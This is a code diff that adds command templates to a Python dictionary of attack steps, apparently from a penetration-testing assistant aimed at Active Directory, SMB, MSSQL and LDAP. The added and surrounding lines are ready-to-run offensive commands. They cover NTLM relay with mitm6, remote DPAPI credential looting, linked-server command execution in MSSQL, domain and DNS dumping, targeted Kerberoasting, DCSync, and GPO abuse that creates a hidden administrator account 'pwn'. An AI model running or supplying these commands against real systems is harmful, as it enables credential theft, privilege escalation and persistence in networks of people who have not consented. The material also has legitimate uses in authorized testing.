@@ -4045,6 +4045,7 @@ _STEP_COMMANDS = {
             "nxc smb <RHOST>/24 --gen-relay-list relay-targets.txt",
             "impacket-ntlmrelayx -tf relay-targets.txt -smb2support -i",
             "impacket-ntlmrelayx -t smb://<RHOST> -smb2support -c '<COMMAND>'",
+            "sudo mitm6 -d <DOMAIN>   # pair with: impacket-ntlmrelayx -6 -t ldaps://<DC> -wh fakewpad --delegate-access  (IPv6 DNS takeover -> RBCD)",
         ],
         7: [  # Coerce auth → relay to escalate
             "python3 PetitPotam.py -u '<USER>' -p '<PASS>' <LHOST> <RHOST>",
@@ -4071,6 +4072,7 @@ _STEP_COMMANDS = {
             "nxc smb <RHOST> -u '<USER>' -p '<PASS>' --sam --lsa",
             "impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<RHOST>'",
             "impacket-secretsdump '<DOMAIN>/<USER>@<RHOST>' -just-dc",
+            "DonPAPI collect -u <USER> -p '<PASS>' -d <DOMAIN> -t <RHOST>   # remote DPAPI loot: browser creds, Wi-Fi keys, credential vault",
         ],
         12: [  # Writable share → hash capture / payload
             "nxc smb <RHOST> -u '<USER>' -p '<PASS>' --shares",
@@ -4719,6 +4721,7 @@ _STEP_COMMANDS = {
         4: [
             "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'SELECT name FROM sys.databases'",
             "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'EXEC sp_linkedservers'   # then in mssqlclient: enum_links ; use_link <SRV>",
+            "mssqlpwner <DOMAIN>/<USER>:<PASS>@<RHOST> interactive   # auto-chains linked servers + impersonation (EXECUTE AS) + command exec",
             "nxc mssql <RHOST> -u <USER> -p <PASS> -q 'SELECT name, password_hash FROM sys.sql_logins'",
             "nxc mssql <RHOST> -u <USER> -p <PASS> -q \"SELECT * FROM OPENROWSET(BULK N'C:\\Windows\\win.ini', SINGLE_CLOB) AS x\"",
         ],
@@ -4797,10 +4800,13 @@ _STEP_COMMANDS = {
             "ldapsearch -x -H ldap://<RHOST> -b 'DC=<DOMAIN>' -s base namingcontexts",
             "ldapsearch -x -H ldap://<RHOST> -b 'DC=<DOMAIN>,DC=<TLD>' '(objectClass=*)'   # full anon dump",
             "windapsearch -d <DOMAIN> --dc-ip <RHOST> -u '' -U",
+            "ldapdomaindump -u '<DOMAIN>\\<USER>' -p '<PASS>' <RHOST>   # one-shot users/groups/computers -> HTML + greppable .grep files",
+            "adidnsdump -u '<DOMAIN>\\<USER>' -p '<PASS>' <RHOST>   # dump AD-integrated DNS zone -> internal hostnames invisible otherwise",
         ],
         2: [
             "nxc ldap <RHOST> -u <USER> -p <PASS> --asreproast asrep.txt",
             "nxc ldap <RHOST> -u <USER> -p <PASS> --kerberoasting kerb.txt",
+            "python3 targetedKerberoast.py -d <DOMAIN> -u <USER> -p '<PASS>' --dc-ip <RHOST>   # sets an SPN on accounts you can write, roasts them, then cleans up (use when normal Kerberoast is empty)",
         ],
         3: [
             "nxc ldap <RHOST> -u <USER> -p <PASS> -M laps",
@@ -4813,6 +4819,7 @@ _STEP_COMMANDS = {
             "certipy shadow auto -u <USER>@<DOMAIN> -p <PASS> -account <TARGET>   # shadow credentials",
             "impacket-secretsdump -just-dc <DOMAIN>/<USER>:<PASS>@<RHOST>   # DCSync (with rights)",
             "bloodyAD -u <USER> -p <PASS> -d <DOMAIN> --host <RHOST> get writable   # ACL abuse targets",
+            "python3 pygpoabuse.py <DOMAIN>/<USER>:'<PASS>' -gpo-id <ID> -command 'net user pwn Passw0rd! /add && net localgroup administrators pwn /add'   # RCE via a GPO you can write (BloodHound often flags this)",
         ],
     },
     "kerberos": {
